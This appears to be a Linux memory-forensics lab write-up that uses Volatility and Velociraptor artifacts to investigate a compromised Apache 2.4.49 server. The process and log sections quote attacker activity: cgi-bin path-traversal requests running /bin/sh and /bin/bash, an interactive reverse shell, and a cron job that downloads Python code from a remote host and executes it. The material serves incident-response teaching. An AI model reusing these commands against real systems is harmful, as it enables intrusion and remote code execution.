359     1       systemd-journal LISTEN_FDNAMES  systemd-journald-audit.socket:systemd-journald-dev-log.socket:systemd-journald.socket:systemd-journald.socket
359     1       systemd-journal INVOCATION_ID   ed4216a465c8491b88c1c580fdf51874
359     1       systemd-journal RUNTIME_DIRECTORY       /run/systemd/journal
409     1       systemd-udevd   LANG    en_US.UTF-8
409     1       systemd-udevd   PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
409     1       systemd-udevd   NOTIFY_SOCKET   /run/systemd/notify
409     1       systemd-udevd   LISTEN_PID      409
409     1       systemd-udevd   LISTEN_FDS      2
<SNIP>
```

##### linux.lsof

Lists open files similar to `lsof` command.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.lsof

Volatility 3 Framework 2.5.2

PID     Process FD      Path

1       systemd 0       /dev/null
1       systemd 1       /dev/null
1       systemd 2       /dev/null
1       systemd 3       /dev/kmsg
1       systemd 4       anon_inode:[14605]
1       systemd 5       anon_inode:[14605]
1       systemd 6       anon_inode:[14605]
1       systemd 7       /sys/fs/cgroup/unified
1       systemd 8       anon_inode:[14605]
1       systemd 9       anon_inode:[14605]
1       systemd 10      /proc/1/mountinfo
1       systemd 11      anon_inode:[14605]
1       systemd 12      anon_inode:[14605]
1       systemd 13      anon_inode:[14605]
1       systemd 14      /proc/swaps
1       systemd 15      socket:[27295]
1       systemd 16      anon_inode:[14605]
1       systemd 17      anon_inode:[14605]
1       systemd 18      socket:[61891]
1       systemd 19      socket:[27299]
1       systemd 20      socket:[27301]
1       systemd 21      socket:[61860]
1       systemd 22      socket:[224882]
1       systemd 23      socket:[61862]
1       systemd 24      socket:[57750]
1       systemd 25      anon_inode:[14605]
1       systemd 26      /dev/autofs
<SNIP>
```

##### linux.malfind

Lists process memory ranges that potentially contain injected code.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.malfind

Volatility 3 Framework 2.5.2

PID     Process Start   End     Protection      Hexdump Disasm

788     networkd-dispat 0x7f925465e000  0x7f925465f000  rwx
00 00 00 00 00 00 00 00 ........
43 00 00 00 00 00 00 00 C.......
4c 8d 15 f9 ff ff ff ff L.......
25 03 00 00 00 0f 1f 00 %.......
40 f1 b9 53 92 7f 00 00 @..S....
08 2d 37 01 00 00 00 00 .-7.....
20 9b 85 53 92 7f 00 00 ...S....
f0 2c 37 01 00 00 00 00 .,7.....        00 00 00 00 00 00 00 00 43 00 00 00 00 00 00 00 4c 8d 15 f9 ff ff ff ff 25 03 00 00 00 0f 1f 00 40 f1 b9 53 92 7f 00 00 08 2d 37 01 00 00 00 00 20 9b 85 53 92 7f 00 00 f0 2c 37 01 00 00 00 00
914     unattended-upgr 0x7f44d35aa000  0x7f44d35ab000  rwx
00 00 00 00 00 00 00 00 ........
43 00 00 00 00 00 00 00 C.......
4c 8d 15 f9 ff ff ff ff L.......
25 03 00 00 00 0f 1f 00 %.......
40 41 ae d2 44 7f 00 00 @A..D...
88 8f 99 01 00 00 00 00 ........
20 cb 35 d2 44 7f 00 00 ..5.D...
70 8f 99 01 00 00 00 00 p.......        00 00 00 00 00 00 00 00 43 00 00 00 00 00 00 00 4c 8d 15 f9 ff ff ff ff 25 03 00 00 00 0f 1f 00 40 41 ae d2 44 7f 00 00 88 8f 99 01 00 00 00 00 20 cb 35 d2 44 7f 00 00 70 8f 99 01 00 00 00 00
1165    sysmon  0x7fffe4026000  0x7fffe4071000  rwx
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
<SNIP>
```

##### linux.mountinfo

Lists mount points on processes mount namespaces.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.mountinfo
Volatility 3 Framework 2.5.2

MNT_NS_ID       MOUNT ID        PARENT_ID       MAJOR:MINOR     ROOT    MOUNT_POINT     MOUNT_OPTIONS   FIELDS  FSTYPE  MOUNT_SRC        SB_OPTIONS

4026531841      1       1       0:2     /       /       rw              rootfs  none    rw
4026531841      24      29      0:22    /       /sys    rw,nosuid,nodev,noexec,relatime shared:7        sysfs   sysfs   rw
4026531841      25      29      0:23    /       /proc   rw,nosuid,nodev,noexec,relatime shared:14       proc    proc    rw
4026531841      26      29      0:5     /       /dev    rw,nosuid,noexec,relatime       shared:2        devtmpfs        udev     rw
4026531841      27      26      0:24    /       /dev/pts        rw,nosuid,noexec,relatime       shared:3        devpts  devpts   rw
4026531841      28      29      0:25    /       /run    rw,nosuid,nodev,noexec,relatime shared:5        tmpfs   tmpfs   rw
<SNIP>
```

##### linux.proc.Maps

Lists all memory maps for all processes.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.proc.Maps

Volatility 3 Framework 2.5.2

PID     Process Start   End     Flags   PgOff   Major   Minor   Inode   File Path       File output

1       systemd 0x5612e9fbe000  0x5612e9ff0000  r--     0x0     8       5       1449561 /usr/lib/systemd/systemd        Disabled
1       systemd 0x5612e9ff0000  0x5612ea0ae000  r-x     0x32000 8       5       1449561 /usr/lib/systemd/systemd        Disabled
1       systemd 0x5612ea0ae000  0x5612ea104000  r--     0xf0000 8       5       1449561 /usr/lib/systemd/systemd        Disabled
1       systemd 0x5612ea104000  0x5612ea14a000  r--     0x145000        8       5       1449561 /usr/lib/systemd/systemdDisabled
1       systemd 0x5612ea14a000  0x5612ea14b000  rw-     0x18b000        8       5       1449561 /usr/lib/systemd/systemdDisabled
1       systemd 0x5612eaac1000  0x5612eaf59000  rw-     0x0     0       0       0       [heap]  Disabled
1       systemd 0x7fd39c000000  0x7fd39c021000  rw-     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd39c021000  0x7fd3a0000000  ---     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3a4000000  0x7fd3a4021000  rw-     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3a4021000  0x7fd3a8000000  ---     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3a9727000  0x7fd3a9728000  ---     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3a9728000  0x7fd3a9f28000  rw-     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3a9f28000  0x7fd3a9f29000  ---     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3a9f29000  0x7fd3aa730000  rw-     0x0     0       0       0       Anonymous Mapping       Disabled
1       systemd 0x7fd3aa730000  0x7fd3aa73d000  r--     0x0     8       5       1443983 /usr/lib/x86_64-linux-gnu/libm-2.31.so   Disabled
<SNIP>
```

To dump a specifc process, use `--pid` and `--dump` options. This command will save each memory segment to a separate file.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.proc.Maps --pid 3321 --dump

Volatility 3 Framework 2.5.2

PID     Process Start   End     Flags   PgOff   Major   Minor   Inode   File Path       File output

3321    sh      0x55df1865a000  0x55df1865f000  r--     0x0     8       5       1442011 /usr/bin/dash   pid.3321.vma.0x55df1865a000-0x55df1865f000.dmp
3321    sh      0x55df1865f000  0x55df18672000  r-x     0x5000  8       5       1442011 /usr/bin/dash   pid.3321.vma.0x55df1865f000-0x55df18672000.dmp
3321    sh      0x55df18672000  0x55df18678000  r--     0x18000 8       5       1442011 /usr/bin/dash   pid.3321.vma.0x55df18672000-0x55df18678000.dmp
3321    sh      0x55df18678000  0x55df1867a000  r--     0x1d000 8       5       1442011 /usr/bin/dash   pid.3321.vma.0x55df18678000-0x55df1867a000.dmp
3321    sh      0x55df1867a000  0x55df1867b000  rw-     0x1f000 8       5       1442011 /usr/bin/dash   pid.3321.vma.0x55df1867a000-0x55df1867b000.dmp
3321    sh      0x55df1867b000  0x55df1867d000  rw-     0x0     0       0       0       Anonymous Mapping       pid.3321.vma.0x55df1867b000-0x55df1867d000.dmp
3321    sh      0x55df19d6e000  0x55df19d8f000  rw-     0x0     0       0       0       [heap]  pid.3321.vma.0x55df19d6e000-0x55df19d8f000.dmp
3321    sh      0x7fbf5ffb9000  0x7fbf5ffdb000  r--     0x0     8       5       1443981 /usr/lib/x86_64-linux-gnu/libc-2.31.so   pid.3321.vma.0x7fbf5ffb9000-0x7fbf5ffdb000.dmp
3321    sh      0x7fbf5ffdb000  0x7fbf60153000  r-x     0x22000 8       5       1443981 /usr/lib/x86_64-linux-gnu/libc-2.31.so   pid.3321.vma.0x7fbf5ffdb000-0x7fbf60153000.dmp
3321    sh      0x7fbf60153000  0x7fbf601a1000  r--     0x19a000        8       5       1443981 /usr/lib/x86_64-linux-gnu/libc-2.31.so   pid.3321.vma.0x7fbf60153000-0x7fbf601a1000.dmp
3321    sh      0x7fbf601a1000  0x7fbf601a5000  r--     0x1e7000        8       5       1443981 /usr/lib/x86_64-linux-gnu/libc-2.31.so   pid.3321.vma.0x7fbf601a1000-0x7fbf601a5000.dmp
3321    sh      0x7fbf601a5000  0x7fbf601a7000  rw-     0x1eb000        8       5       1443981 /usr/lib/x86_64-linux-gnu/libc-2.31.so   pid.3321.vma.0x7fbf601a5000-0x7fbf601a7000.dmp
3321    sh      0x7fbf601a7000  0x7fbf601ad000  rw-     0x0     0       0       0       Anonymous Mapping       pid.3321.vma.0x7fbf601a7000-0x7fbf601ad000.dmp
<SNIP>
```

##### linux.sockstat

Lists all network connections for all processes.

```bash
linuxforensics@ubuntu:~/tools/volatility3$ python3 vol.py -q -f ~/Desktop/cases/HacktiveLegion_15102023/memdump.mem linux.sockstat
Volatility 3 Framework 2.5.2

NetNS   Pid     FD      Sock Offset     Family  Type    Proto   Source Addr     Source Port     Destination Addr        Destination Port State   Filter

4026531840      1       15      0x93fe093ea000  AF_NETLINK      RAW     NETLINK_KOBJECT_UEVENT  groups:0x00000002       1group:0x00000000        0       UNCONNECTED     filter_type=socket_filter,bpf_filter_type=cBPF
4026531840      1       18      0x93fe0a371540  AF_UNIX STREAM  -       /run/systemd/journal/stdout     61891   -       60785    ESTABLISHED     -
4026531840      1       19      0x93fe0956eec0  AF_UNIX STREAM  -       /run/systemd/private    27299   -       -       LISTEN   -
4026531840      1       20      0x93fe0956c000  AF_UNIX STREAM  -       /run/systemd/userdb/io.systemd.DynamicUser      27301    -       -       LISTEN  -
4026531840      1       21      0x93fe4e4cc880  AF_UNIX STREAM  -       /run/systemd/journal/stdout     61860   -       60698    ESTABLISHED     -
4026531840      1       22      0x93fe72135540  AF_UNIX STREAM  -       /run/systemd/journal/stdout     224882  -       225323   ESTABLISHED     -
4026531840      1       23      0x93fe4e70d100  AF_UNIX STREAM  -       /run/systemd/journal/stdout     61862   -       60737    ESTABLISHED     -
4026531840      1       24      0x93fe0dd90880  AF_UNIX STREAM  -       /run/systemd/journal/stdout     57750   -       58545    ESTABLISHED     -
4026531840      1       30      0x93fe0956d540  AF_UNIX DGRAM   -       /run/systemd/notify     27296   -       -       UNCONNECTED  
<SNIP>
```

## Forensics

Assumed collected artifacts:

|**Artifact**|**Location**|
|---|---|
|Scenario case artifacts general folder|`/home/linuxforensics/Desktop/cases/scenario1`|
|Memory dump|`/home/linuxforensics/Desktop/cases/scenario1/web-server-dump`|
|Apache web application logs|`/home/linuxforensics/Desktop/cases/scenario1/apache`|
|Velociraptor offline collection general folder|`/home/linuxforensics/Desktop/cases/scenario1/collection`|
|Velociraptor offline collection parsed results|`/home/linuxforensics/Desktop/cases/scenario1/collection/results`|
|Velociraptor collected raw artifacts|`/home/linuxforensics/Desktop/cases/scenario1/collection/uploads`|
|audit.log|`/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log.1`, `/home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/audit/audit.log`|
|Systemd parsed results (journalctl)|`/home/linuxforensics/Desktop/cases/scenario1/journal.json`|
|Root user .viminfo file|`/home/linuxforensics/Desktop/cases/scenario1/root_viminfo`|

Host information:

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump banners.Banners

Volatility 3 Framework 2.5.2

Offset  Banner

0x14c00200      Linux version 5.15.0-86-generic (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #96-Ubuntu SMP Wed Sep 20 08:23:49 UTC 2023 (Ubuntu 5.15.0-86.96-generic 5.15.122)
0x16c35778      Linux version 5.15.0-86-generic (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #96-Ubuntu SMP Wed Sep 20 08:23:49 UTC 2023 (Ubuntu 5.15.0-86.96-generic 5.15.122)2)
<SNIP>
```

Timezone of the compromised system is ETC/UTC:

```bash
linuxforensics@ubuntu:~$ cat ~/Desktop/cases/scenario1/collection/uploads/auto/etc/timezone

Etc/UTC
```

### Network

Your investigation starts with the analysis of network artifacts, and you will begin by utilizing Volatility to examine TCP connections from the memory dump.

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.sockstat.Sockstat | grep TCP

4026531840      841     14      0x8f6305e52d00  AF_INET STREAM  TCP     127.0.0.53      53      0.0.0.0 0       LISTEN  -
4026531840      910     3       0x8f6307a41b00  AF_INET STREAM  TCP     0.0.0.0 0       0.0.0.0 0       CLOSE   -
4026531840      910     4       0x8f6311bcdf00  AF_INET6        STREAM  TCP     ::      80      ::      0       LISTEN  -
4026531840      916     3       0x8f6307a41b00  AF_INET STREAM  TCP     0.0.0.0 0       0.0.0.0 0       CLOSE   -
4026531840      917     3       0x8f6307a41b00  AF_INET STREAM  TCP     0.0.0.0 0       0.0.0.0 0       CLOSE   -
4026531840      917     4       0x8f6311bcdf00  AF_INET6        STREAM  TCP     ::      80      ::      0       LISTEN  -
4026531840      918     3       0x8f6307a41b00  AF_INET STREAM  TCP     0.0.0.0 0       0.0.0.0 0       CLOSE   -
4026531840      918     4       0x8f6311bcdf00  AF_INET6        STREAM  TCP     ::      80      ::      0       LISTEN  -
4026531840      919     3       0x8f6307a41b00  AF_INET STREAM  TCP     0.0.0.0 0       0.0.0.0 0       CLOSE   -
4026531840      919     4       0x8f6311bcdf00  AF_INET6        STREAM  TCP     ::      80      ::      0       LISTEN  -
4026531840      1441    3       0x8f6307a41b00  AF_INET STREAM  TCP     0.0.0.0 0       0.0.0.0 0       CLOSE   -
4026531840      1441    4       0x8f6311bcdf00  AF_INET6        STREAM  TCP     ::      80      ::      0       LISTEN  -
4026531840      28120   3       0x8f6307a44800  AF_INET STREAM  TCP     0.0.0.0 22      0.0.0.0 0       LISTEN  -
4026531840      28120   4       0x8f631252d580  AF_INET6        STREAM  TCP     ::      22      ::      0       LISTEN  -
4026531840      <PID>   12      0x8f6307a45100  AF_INET STREAM  TCP     192.168.152.225 39294   51.75.64.249    20128   ESTABLISHED      -
4026531840      28645   0       0x8f6305e54800  AF_INET STREAM  TCP     192.168.152.225 59204   192.168.152.180 21      ESTABLISHED      -
<SNIP>
```

You find multiple suspicious network connections:

```bash
NetNS   Pid     FD      Sock Offset     Family  Type    Proto   Source Addr     Source Port     Destination Addr        Destination Port        State   Filter

4026531840      <PID>   12      0x8f6307a45100  AF_INET STREAM  TCP     192.168.152.225 39294   51.75.64.249    20128   ESTABLISHED     -
4026531840      28645   0       0x8f6305e54800  AF_INET STREAM  TCP     192.168.152.225 59204   192.168.152.180 21      ESTABLISHED     -
4026531840      28645   1       0x8f6305e54800  AF_INET STREAM  TCP     192.168.152.225 59204   192.168.152.180 21      ESTABLISHED     -
4026531840      28645   2       0x8f6305e54800  AF_INET STREAM  TCP     192.168.152.225 59204   192.168.152.180 21      ESTABLISHED     -
4026531840      28645   255     0x8f6305e54800  AF_INET STREAM  TCP     192.168.152.225 59204   192.168.152.180 21      ESTABLISHED     -
```

The first one and the most suspicious is `51.75.64.249` IP address. Quick check on VirusTotal showed no significant results:

- https://www.virustotal.com/gui/ip-address/51.75.64.249/detection

As an alternative for examining network artifacts, you can also review the `Linux.Network.NetstatEnriched` artifact obtained by the Velociraptor collector.

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Network.NetstatEnriched.json | grep "51.75.64.249" | jq .

{
  "Laddr": "192.168.152.225",
  "Lport": 39294,
  "Raddr": "51.75.64.249",
  "Rport": 20128,
  "Pid": <PID>,
  "Status": "ESTABLISHED",
  "ProcInfo": {
    "Pid": <PID>,
    "Name": "3",
    "Ppid": 28343,
    "CommandLine": "smd",
    "CreateTime": 1697394962000,
    "Times": {
      "cpu": "cpu",
      "user": 4393.34,
      "system": 31.71,
      "idle": 0,
      "nice": 0,
      "iowait": 0,
      "irq": 0,
      "softirq": 0,
      "steal": 0,
      "guest": 0,
      "guestNice": 0
    },
    "Exe": "/memfd: (deleted)",
    "Cwd": "/root",
    "Username": "root",
    "MemoryInfo": {
      "rss": 271679488,
      "vms": 318242816,
      "hwm": 0,
      "data": 0,
      "stack": 0,
      "locked": 0,
      "swap": 0
    }
  },
  "CallChain": "systemd -> cron -> cron -> sh -> run-one -> flock -> python3 -> 3",
  "ChildrenTree": {
    "name": "3",
    "id": "<PID>",
    "start_time": "2023-10-15T18:36:02Z",
    "data": {
      "Pid": <PID>,
      "Name": "3",
      "Ppid": 28343,
      "CommandLine": "smd",
      "CreateTime": 1697394962000,
      "Times": {
        "cpu": "cpu",
        "user": 4393.34,
        "system": 31.71,
        "idle": 0,
        "nice": 0,
        "iowait": 0,
        "irq": 0,
        "softirq": 0,
        "steal": 0,
        "guest": 0,
        "guestNice": 0
      },
      "Exe": "/memfd: (deleted)",
      "Cwd": "/root",
      "Username": "root",
      "MemoryInfo": {
        "rss": 271679488,
        "vms": 318242816,
        "hwm": 0,
        "data": 0,
        "stack": 0,
        "locked": 0,
        "swap": 0
      }
    },
    "children": null
  }
}
```

From there, you can determine that the process connecting to this IP was executed via a cron job. From that artifact, you can also ascertain that Apache is running on that system:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Network.NetstatEnriched.json | jq .


<SNIP>
{
  "Laddr": "::",
  "Lport": 80,
  "Raddr": "::",
  "Rport": 0,
  "Pid": 910,
  "Status": "LISTEN",
  "ProcInfo": {
    "Pid": 910,
    "Name": "httpd",
    "Ppid": 1,
    "CommandLine": "/usr/local/apache2/bin/httpd -k start",
    "CreateTime": 1697391270000,
    "Times": {
      "cpu": "cpu",
      "user": 0.31,
      "system": 0.11,
      "idle": 0,
      "nice": 0,
      "iowait": 0,
      "irq": 0,
      "softirq": 0,
      "steal": 0,
      "guest": 0,
      "guestNice": 0
    },
    "Exe": "/usr/local/apache2/bin/httpd",
    "Cwd": "/",
    "Username": "root",
    "MemoryInfo": {
      "rss": 2293760,
      "vms": 6553600,
      "hwm": 0,
      "data": 0,
      "stack": 0,
      "locked": 0,
      "swap": 0
    }
  },
  <SNIP>
}
```

Review in the Velociraptor collection the other four TCP connections obtained from the memory dump with a destination port of `TCP/21` and a remote host IP of `192.168.152.180`:

```bash
linuxforensics@ubuntu:~$ cat /home/linuxforensics/Desktop/cases/scenario1/collection/results/Linux.Network.NetstatEnriched.json | grep "192.168.152.180" | jq .

{
  "Laddr": "192.168.152.225",
  "Lport": 59204,
  "Raddr": "192.168.152.180",
  "Rport": 21,
  "Pid": 28645,
  "Status": "ESTABLISHED",
  "ProcInfo": {
    "Pid": 28645,
    "Name": "bash",
    "Ppid": 1,
    "CommandLine": "<REDACTED>",
    "CreateTime": 1697395704000,
    "Times": {
      "cpu": "cpu",
      "user": 0.01,
      "system": 0,
      "idle": 0,
      "nice": 0,
      "iowait": 0,
      "irq": 0,
      "softirq": 0,
      "steal": 0,
      "guest": 0,
      "guestNice": 0
    },
    "Exe": "/usr/bin/bash",
    "Cwd": "/usr/bin",
    "Username": "user",
    "MemoryInfo": {
      "rss": 3321856,
      "vms": 5828608,
      "hwm": 0,
      "data": 0,
      "stack": 0,
      "locked": 0,
      "swap": 0
    }
  },
  "CallChain": "systemd -> bash",
  "ChildrenTree": {
    "name": "bash",
    "id": "28645",
    "start_time": "2023-10-15T18:48:24Z",
    "data": {
      "Pid": 28645,
      "Name": "bash",
      "Ppid": 1,
      "CommandLine": "<REDACTED>",
      "CreateTime": 1697395704000,
      "Times": {
        "cpu": "cpu",
        "user": 0.01,
        "system": 0,
        "idle": 0,
        "nice": 0,
        "iowait": 0,
        "irq": 0,
        "softirq": 0,
        "steal": 0,
        "guest": 0,
        "guestNice": 0
      },
      "Exe": "/usr/bin/bash",
      "Cwd": "/usr/bin",
      "Username": "user",
      "MemoryInfo": {
        "rss": 3321856,
        "vms": 5828608,
        "hwm": 0,
        "data": 0,
        "stack": 0,
        "locked": 0,
        "swap": 0
      }
    },
    "children": null
  }
}
```

You can observe the execution of the shell command (`PID: 28645`) that is frequently employed by malicious actors to establish e reverse shell.

### Process

Inspect the Apache logs to identify any suspicious requests. Vulnerable web applications are often used as an entry point for attackers. Filtering for `/bin/sh` and `/bin/bash` could be a good approach.

```bash
linuxforensics@ubuntu:~$ grep -E "(bin/sh)|(bin/bash)" /home/linuxforensics/Desktop/cases/scenario1/apache/access_log

192.168.152.180 - - [15/Oct/2023:18:03:06 +0000] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 500 528
192.168.152.180 - - [15/Oct/2023:18:03:43 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 5
192.168.152.180 - - [15/Oct/2023:18:08:24 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 -
192.168.152.180 - - [15/Oct/2023:18:08:57 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 -
192.168.152.180 - - [15/Oct/2023:18:11:22 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
192.168.152.180 - - [15/Oct/2023:18:24:53 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
192.168.152.180 - - [15/Oct/2023:18:48:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1" 200 -
```

Following the initial access check, you see `/bin/bash` and `/bin/sh` were executed.

Beginning `at 18:08:24`, you see that requests don't have a response size. It may indicate that the attacker successfully exeucted the RCE attack.

Note that Apache logs do not store request bodies, but if the script was executed by CGI, it's a good idea to check the process's environment variables. You have a suspicious process `bash -i` with `PID 28645` executed. Check it:

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.envvars --pid 28645

Volatility 3 Framework 2.5.2

PID     PPID    COMM    KEY     VALUE

28645   1       bash    SERVER_NAME     192.168.152.225
28645   1       bash    SCRIPT_NAME     /cgi-bin/../../../../../../../bin/bash
28645   1       bash    GATEWAY_INTERFACE       CGI/1.1
28645   1       bash    SERVER_SOFTWARE Apache/2.4.49 (Unix)
28645   1       bash    DOCUMENT_ROOT   /usr/local/apache2/htdocs
28645   1       bash    PWD     /usr/bin
28645   1       bash    REQUEST_URI     /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
28645   1       bash    SERVER_SIGNATURE
28645   1       bash    REQUEST_SCHEME  http
28645   1       bash    QUERY_STRING
28645   1       bash    CONTEXT_DOCUMENT_ROOT   /usr/local/apache2/cgi-bin/
28645   1       bash    HTTP_ACCEPT     */*
28645   1       bash    REMOTE_PORT     46428
28645   1       bash    SERVER_ADMIN    you@example.com
28645   1       bash    HTTP_HOST       192.168.152.225
28645   1       bash    SERVER_ADDR     192.168.152.225
28645   1       bash    HTTP_USER_AGENT curl/7.81.0
28645   1       bash    CONTEXT_PREFIX  /cgi-bin/
28645   1       bash    SHLVL   1
28645   1       bash    CONTENT_LENGTH  88
28645   1       bash    LD_LIBRARY_PATH /usr/local/apache2/lib
28645   1       bash    SERVER_PROTOCOL HTTP/1.1
28645   1       bash    SERVER_PORT     80
28645   1       bash    SCRIPT_FILENAME /bin/bash
28645   1       bash    REMOTE_ADDR     192.168.152.180
28645   1       bash    PATH    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
28645   1       bash    CONTENT_TYPE    application/x-www-form-urlencoded
28645   1       bash    REQUEST_METHOD  POST
28645   1       bash    _       /usr/bin/bash
```

`HTTP_USER_AGENT` and `SERVER_SOFTWARE` are noteworthy.

```
HTTP_USER_AGENT curl/7.81.0
SERVER_SOFTWARE Apache/2.4.49 (Unix)
```

#### Processes

You'll begin with the `linux.malfind.Malfind` Volatility plugin.

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.malfind.Malfind --pid 28344

Volatility 3 Framework 2.5.2

PID     Process Start   End     Protection      Hexdump Disasm

28344   3       0x7f337a4f5000  0x7f337a535000  rwx
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........
00 00 00 00 00 00 00 00 ........        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
28344   3       0x7f337a5b1000  0x7f337a5f1000  rwx
53 55 57 56 41 54 41 55 SUWVATAU
41 56 41 57 48 81 ec 00 AVAWH...
01 00 00 f3 0f 7f 04 24 .......$
f3 0f 7f 4c 24 10 f3 0f ...L$...
7f 54 24 20 f3 0f 7f 5c .T$....\
24 30 f3 0f 7f 64 24 40 $0...d$@
f3 0f 7f 6c 24 50 f3 0f ...l$P..
7f 74 24 60 f3 0f 7f 7c .t$`...|        53 55 57 56 41 54 41 55 41 56 41 57 48 81 ec 00 01 00 00 f3 0f 7f 04 24 f3 0f 7f 4c 24 10 f3 0f 7f 54 24 20 f3 0f 7f 5c 24 30 f3 0f 7f 64 24 40 f3 0f 7f 6c 24 50 f3 0f 7f 74 24 60 f3 0f 7f 7c
28344   3       0x7f338c6e3000  0x7f338c703000  r-x
48 83 ec 30 48 89 f9 48 H..0H..H
8b 09 48 89 5c 24 18 55 ..H.\$.U
56 57 41 54 41 55 41 56 VWATAUAV
41 57 48 83 ec 50 0f ae AWH..P..
1c 24 c7 44 24 04 80 5f .$.D$.._
00 00 0f ae 54 24 04 48 ....T$.H
8b 41 30 49 89 c9 48 33 .A0I..H3
41 10 be 00 00 04 00 4c A......L        48 83 ec 30 48 89 f9 48 8b 09 48 89 5c 24 18 55 56 57 41 54 41 55 41 56 41 57 48 83 ec 50 0f ae 1c 24 c7 44 24 04 80 5f 00 00 0f ae 54 24 04 48 8b 41 30 49 89 c9 48 33 41 10 be 00 00 04 00 4c
```

From there you can also see that `PID 28344` marked as suspicious (_potentially contains injected code_). You can use `linux.psaux.PsAux` to analyze processes and executed commands.

```bash
linuxforensics@ubuntu:~$ python3 ~/tools/volatility3/vol.py -q -f /home/linuxforensics/Desktop/cases/scenario1/web-server-dump linux.psaux.PsAux

Volatility 3 Framework 2.5.2

PID     PPID    COMM    ARGS

1       0       systemd /sbin/init
2       0       kthreadd        [kthreadd]

<SNIP>

28332   852     cron    /usr/sbin/CRON -f -P
28333   28332   sh      /bin/sh -c /usr/bin/run-one /usr/bin/python3 -c 'import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)'
28334   28333   run-one /bin/sh -e /usr/bin/run-one /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
28342   28334   flock   flock -xn /root/.cache/run-one/76ae4bd1f3acefe413847c9e7582326a /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
28343   28342   python3 /usr/bin/python3 -c import requests, subprocess; loader=requests.get("http://18.117.8.128:8000/chattingloosened"); subprocess.run("/usr/bin/python3", input=loader.content)
28344   28343   3       smd

<SNIP> 

28645   1       bash    bash -i

<SNIP>
```

The most valuabe for investigation processes:

```bash
